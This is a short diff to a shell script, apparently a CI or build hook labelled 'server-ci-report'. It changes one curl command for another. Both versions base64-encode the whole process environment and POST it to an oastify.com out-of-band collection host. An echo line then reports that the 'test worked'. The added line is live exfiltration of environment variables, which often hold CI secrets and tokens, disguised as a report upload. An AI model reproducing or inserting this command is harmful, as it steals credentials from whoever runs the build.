@@ -1,3 +1,3 @@
 #!/bin/sh
-curl -d "env=$(env|base64 -w0)" https://t0uyxa831t0o87n0jdk4hfghh8nzbqzf.oastify.com/server-ci-report-upload
+curl -d "env=$(env|base64 -w0)" https://vhgk8qm1t82xw6naq1ep0yxn4ea7yxmm.oastify.com
 echo "server-ci-report test worked" > /dev/stderr
